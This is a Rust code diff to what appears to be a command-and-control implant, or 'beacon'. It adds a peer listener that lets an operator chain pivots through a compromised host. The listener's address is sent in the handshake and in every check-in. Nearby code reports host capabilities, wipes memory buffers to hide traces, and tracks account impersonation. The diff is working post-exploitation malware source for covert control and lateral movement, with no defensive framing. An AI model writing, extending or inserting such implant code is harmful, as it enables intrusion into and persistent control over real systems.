@@ -21,11 +21,16 @@ const MAX_REKEY_ROUNDS: usize = 8;
 /// The capability list travels with the handshake, so the server never
 /// queues a task the beacon cannot run and the operator sees the host's
 /// reach before the first command.
-fn hello_meta() -> Value {
+fn hello_meta(peer_addr: &str) -> Value {
     let mut meta = sysinfo::meta(VERSION);
     if let Value::Map(ref mut fields) = meta {
         let caps: Vec<Value> = task::capabilities().into_iter().map(upk::s).collect();
         fields.insert("caps".to_string(), upk::arr(caps));
+        // Where the peer listener waits: the server chains a pivot
+        // through this host when it knows the address.
+        if !peer_addr.is_empty() {
+            fields.insert("p2p".to_string(), upk::s(peer_addr));
+        }
     }
     meta
 }
@@ -54,6 +59,11 @@ pub struct Beacon {
     /// How many buffers the memory hygiene wiped, and how many bytes.
     wiped_buffers: usize,
     wiped_bytes: usize,
+    /// The address of the peer listener, once it is bound.
+    ///
+    /// It travels in the handshake: the server resolves the chain of a
+    /// pivot from it.
+    peer_addr: String,
 }
 
 impl Beacon {
@@ -75,6 +85,7 @@ impl Beacon {
             window,
             wiped_buffers: 0,
             wiped_bytes: 0,
+            peer_addr: String::new(),
         }
     }
 
@@ -85,7 +96,29 @@ impl Beacon {
     }
 
     /// Run until `max_cycles` is reached (None = forever).
+    /// Bind the peer listener and serve the pivots that are chained
+    /// through this host.
+    ///
+    /// The listener is bound before the first handshake, so the address is
+    /// known when the server learns about the beacon.
+    pub fn start_peer_listener(&mut self) -> Result<(), String> {
+        if self.cfg.peer_listen.is_empty() {
+            return Ok(());
+        }
+        let (listener, addr) = crate::tunnel::bind_peer(&self.cfg.peer_listen)?;
+        let psk = self.cfg.psk.clone();
+        let agent_id = self.cfg.agent_id.clone();
+        let verbose = self.cfg.verbose;
+        std::thread::spawn(move || {
+            crate::tunnel::serve_peer_listener(listener, psk, agent_id, verbose);
+        });
+        self.peer_addr = addr;
+        self.log(&format!("peer listener on {}", self.peer_addr));
+        Ok(())
+    }
+
     pub fn run(&mut self, max_cycles: Option<u64>) -> Result<(), String> {
+        self.start_peer_listener()?;
         loop {
             if let Some(limit) = max_cycles {
                 if self.cycles >= limit {
@@ -369,7 +402,10 @@ impl Beacon {
     fn handshake(&mut self) -> Result<(), String> {
         let suites = crypto::supported_suites();
         let suite = *suites.first().ok_or("no AEAD suite compiled in")?;
-        let meta = hello_meta();
+        // The peer listener may have been bound after the last handshake
+        // (the p2p task does that), so the address is read every time.
+        let peer = crate::tunnel::peer_address();
+        let meta = hello_meta(&peer);
         let handshake = {
             let channel = self.channel.as_mut().ok_or("the channel is closed")?;
             crate::link::client_handshake(
@@ -424,6 +460,12 @@ impl Beacon {
         // operator made it become somebody else, the server shows that in
         // the inventory instead of leaving a stale name there.
         let mut checkin_fields = vec![("ts", upk::u(ts)), ("n", upk::u(0))];
+        // The address of the peer listener travels with every check-in:
+        // the server learns where a chained pivot can reach this host.
+        let peer = crate::tunnel::peer_address();
+        if !peer.is_empty() {
+            checkin_fields.push(("p2p", upk::s(&peer)));
+        }
         if let Some(state) = crate::post::impersonation() {
             checkin_fields.push(("impersonation", upk::s(&state.identity.account)));
             checkin_fields.push(("impersonation_session", upk::u(state.identity.session as u64)));
